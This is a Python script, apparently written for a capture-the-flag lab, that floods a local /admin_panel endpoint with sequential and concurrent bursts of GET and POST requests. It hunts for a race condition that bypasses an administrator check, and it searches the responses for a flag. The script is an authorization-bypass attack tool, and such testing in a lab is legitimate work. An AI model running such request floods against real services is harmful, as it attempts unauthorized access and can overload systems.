import requests
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

# Configuration
base_url = "http://127.0.0.1:32992"
admin_endpoint = f"{base_url}/admin_panel"
cookies = {"session": "ahYINfgSeZIuIVlIHpUK5jZSk4ahE5y7ZFvZds3KuA8"}

# Store unique responses
found_responses = {}
found_lock = threading.Lock()


def make_request(request_id, method="GET"):
    """Make a single request and capture any anomalous responses."""
    try:
        if method == "GET":
            response = requests.get(
                admin_endpoint,
                cookies=cookies,
                timeout=5,
                allow_redirects=False
            )
        else:
            response = requests.post(
                admin_endpoint,
                cookies=cookies,
                timeout=5,
                allow_redirects=False
            )
        
        content_preview = response.text[:500] if response.text else "(empty)"
        
        # Look for success indicators
        if response.status_code == 200:
            if "Only administrator users" not in response.text and len(response.text) > 100:
                # Potential success - different content
                with found_lock:
                    key = f"ANOMALY_{response.status_code}"
                    if key not in found_responses:
                        found_responses[key] = {
                            "request_id": request_id,
                            "status": response.status_code,
                            "length": len(response.text),
                            "method": method,
                            "preview": content_preview
                        }
                        print(f"\n[!] ANOMALY DETECTED at request {request_id}")
                        print(f"    Status: {response.status_code} | Method: {method} | Length: {len(response.text)}")
                        print(f"    Preview: {content_preview}")
                return "anomaly"
        
        # Look for flag patterns
        if "FLAG" in response.text.upper() or "flag{" in response.text.lower():
            with found_lock:
                key = f"FLAG_{request_id}"
                found_responses[key] = {
                    "request_id": request_id,
                    "status": response.status_code,
                    "length": len(response.text),
                    "method": method,
                    "preview": response.text
                }
            print(f"\n[!!!] FLAG FOUND at request {request_id}")
            print(response.text)
            return "flag"
        
        return "normal"
        
    except Exception as e:
        with found_lock:
            key = f"ERROR_{request_id}"
            if key not in found_responses:
                found_responses[key] = {
                    "request_id": request_id,
                    "error": str(e)
                }
        return "error"


print("=" * 70)
print("TOCTOU RACE CONDITION TEST - /admin_panel")
print("=" * 70)

# Test 1: Baseline - single request
print("\n[TEST 1] Baseline single request...")
base_resp = requests.get(admin_endpoint, cookies=cookies, timeout=5)
print(f"Status: {base_resp.status_code} | Length: {len(base_resp.text)}B")
base_preview = base_resp.text[:300].replace('\n', ' ')
print(f"Response snippet: {base_preview}...")
baseline_denial = "Only administrator users" in base_resp.text
print(f"Baseline denial confirmed: {baseline_denial}")

# Test 2: Rapid sequential requests (no threading)
print("\n[TEST 2] Rapid sequential requests (100 requests)...")
seq_start = time.time()
for i in range(100):
    result = make_request(f"seq_{i}", "GET")
    if result in ["anomaly", "flag"]:
        print(f"  -> Something found at iteration {i}")
        break
    if i % 20 == 0:
        print(f"  Progress: {i}/100")
seq_elapsed = time.time() - seq_start
print(f"  Completed in {seq_elapsed:.2f}s ({100/seq_elapsed:.1f} req/s)")

# Test 3: Burst concurrent requests (threaded)
print("\n[TEST 3] Concurrent burst (50 threads)...")
concurrent_results = []
burst_start = time.time()
with ThreadPoolExecutor(max_workers=50) as executor:
    futures = [executor.submit(make_request, f"burst_{i}", "GET") for i in range(50)]
    for future in as_completed(futures):
        concurrent_results.append(future.result())
burst_elapsed = time.time() - burst_start
print(f"  Completed in {burst_elapsed:.2f}s ({50/burst_elapsed:.1f} req/s)")
unique_results = set(concurrent_results)
print(f"  Result types: {unique_results}")

# Test 4: High-volume burst (100 threads)
print("\n[TEST 4] High-volume concurrent burst (100 threads)...")
burst2_start = time.time()
with ThreadPoolExecutor(max_workers=100) as executor:
    futures = [executor.submit(make_request, f"burst2_{i}", "GET") for i in range(100)]
    for future in as_completed(futures):
        pass
burst2_elapsed = time.time() - burst2_start
print(f"  Completed in {burst2_elapsed:.2f}s ({100/burst2_elapsed:.1f} req/s)")

# Test 5: Alternating GET/POST rapid fire
print("\n[TEST 5] Alternating GET/POST rapid fire (200 requests)...")
for i in range(200):
    method = "GET" if i % 2 == 0 else "POST"
    result = make_request(f"alt_{i}", method)
    if result in ["anomaly", "flag"]:
        print(f"  -> Found at {method} request {i}")
        break
    if i % 50 == 0:
        print(f"  Progress: {i}/200")

# Test 6: Micro-delay rapid requests (to catch timing windows)
print("\n[TEST 6] Micro-delay rapid requests (50 requests, 1ms delay)...")
for i in range(50):
    result = make_request(f"micro_{i}", "GET")
    if result in ["anomaly", "flag"]:
        print(f"  -> Found at request {i}")
        break
    time.sleep(0.001)  # 1ms delay

# Test 7: No-delay spam (as fast as possible)
print("\n[TEST 7] Maximum rate spamming (500 requests)...")
spam_start = time.time()
spam_count = {"normal": 0, "anomaly": 0, "flag": 0, "error": 0}
for i in range(500):
    result = make_request(f"spam_{i}", "GET")
    spam_count[result] += 1
    if result in ["anomaly", "flag"]:
        print(f"  -> FOUND at request {i}: {result}")
        break
spam_elapsed = time.time() - spam_start
print(f"  Completed in {spam_elapsed:.2f}s ({500/spam_elapsed:.1f} req/s)")
print(f"  Counts: {spam_count}")

# Summary
print("\n" + "=" * 70)
print("SUMMARY")
print("=" * 70)

if found_responses:
    print(f"\nFound {len(found_responses)} unique anomalous responses:")
    for key, data in found_responses.items():
        print(f"\n{key}:")
        print(f"  {data}")
else:
    print("\nNo anomalous responses detected.")
    print("All requests returned the expected privilege denial.")

print(f"\nAll TOCTOU tests completed.")
print(f"Total requests sent: {100 + 50 + 100 + 200 + 50 + 500} = 1000+")

